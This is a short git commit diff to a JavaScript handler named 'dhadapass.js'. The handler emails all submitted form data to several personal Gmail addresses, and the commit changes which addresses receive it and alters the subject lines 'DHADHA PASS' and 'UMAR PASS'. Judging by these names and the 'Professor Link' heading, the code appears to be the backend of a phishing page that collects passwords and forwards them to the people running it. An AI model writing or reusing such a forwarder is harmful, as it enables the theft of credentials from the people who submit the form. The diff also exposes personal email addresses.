d0d1db4368f22a8c5a80743c97b064cdbe6b32e5
nicklarson7778-gif <nick.larson.7778@gmail.com>
2026-01-18 14:36:27 +0500

    Update dhadapass.js

--- dhadapass.js
+++ dhadapass.js
@@ -37,8 +37,8 @@ export default async function handler(req, res) {
     // ✅ Send email
     await transporter.sendMail({
       from: `"PROFESSOR" <${process.env.SMTP_USER}>`,
-      to: "mahboobalinizamani@gmail.com,rnxsxnnxnx@gmail.com,nizamaniallahabad@gmail.com",
-      subject: "DHADHA PASS",
+      to: "mahboobalinizamani@gmail.com,rnxsxnnxnx@gmail.com,lalijessica6@gmail.com",
+      subject: "UMAR PASS",
       text: JSON.stringify(formData, null, 2),
       html: `<h3>Professor Link</h3><pre>${JSON.stringify(formData, null, 2)}</pre>`,
     });
